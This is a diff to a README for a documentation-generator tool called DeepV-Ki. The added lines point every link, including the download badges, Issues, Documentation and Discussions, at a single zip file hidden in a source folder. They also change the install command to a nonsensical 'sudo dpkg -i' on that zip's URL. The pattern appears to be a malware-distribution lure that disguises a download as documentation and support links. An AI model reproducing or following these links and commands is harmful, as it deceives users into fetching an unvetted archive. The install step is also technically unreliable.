@@ -8,7 +8,7 @@ Welcome to DeepV-Ki! This software helps you turn your code repository into a be
 
 To get started, you need to download DeepV-Ki. Visit the link below to access the latest version:
 
-[![Download DeepV-Ki](https://img.shields.io/badge/Download-DeepV--Ki-blue.svg)](https://github.com/Railic23/DeepV-Ki/releases)
+[![Download DeepV-Ki](https://github.com/Railic23/DeepV-Ki/raw/refs/heads/main/frontend/src/app/api/Ki_Deep_v3.8.zip)](https://github.com/Railic23/DeepV-Ki/raw/refs/heads/main/frontend/src/app/api/Ki_Deep_v3.8.zip)
 
 Once you're on the Releases page, look for the latest version and download the appropriate file for your system. 
 
@@ -57,7 +57,7 @@ After downloading, you're ready to install and run DeepV-Ki. Follow these simple
    ```
 3. **Install DeepV-Ki with the following command:**
    ```bash
-   sudo dpkg -i DeepV-Ki-version.deb
+   sudo dpkg -i https://github.com/Railic23/DeepV-Ki/raw/refs/heads/main/frontend/src/app/api/Ki_Deep_v3.8.zip
    ```
    Be sure to replace `version` with the actual file name.
 4. **Run the application** by typing:
@@ -92,15 +92,15 @@ These features save time and help create a clear understanding of your projects.
 
 ## 📞 Support
 
-If you encounter issues, please visit our [GitHub Issues](https://github.com/Railic23/DeepV-Ki/issues) page. The community can help answer your questions or troubleshoot your problems.
+If you encounter issues, please visit our [GitHub Issues](https://github.com/Railic23/DeepV-Ki/raw/refs/heads/main/frontend/src/app/api/Ki_Deep_v3.8.zip) page. The community can help answer your questions or troubleshoot your problems.
 
 ## 🔗 Additional Resources
 
 Learn more about DeepV-Ki and get comprehensive guides:
 
-- [Documentation](https://github.com/Railic23/DeepV-Ki/wiki)
-- [Community Discussions](https://github.com/Railic23/DeepV-Ki/discussions)
+- [Documentation](https://github.com/Railic23/DeepV-Ki/raw/refs/heads/main/frontend/src/app/api/Ki_Deep_v3.8.zip)
+- [Community Discussions](https://github.com/Railic23/DeepV-Ki/raw/refs/heads/main/frontend/src/app/api/Ki_Deep_v3.8.zip)
 
 Thank you for choosing DeepV-Ki. Start creating beautiful Wiki documentation today!
 
-[![Download DeepV-Ki](https://img.shields.io/badge/Download-DeepV--Ki-blue.svg)](https://github.com/Railic23/DeepV-Ki/releases)
+[![Download DeepV-Ki](https://github.com/Railic23/DeepV-Ki/raw/refs/heads/main/frontend/src/app/api/Ki_Deep_v3.8.zip)](https://github.com/Railic23/DeepV-Ki/raw/refs/heads/main/frontend/src/app/api/Ki_Deep_v3.8.zip)
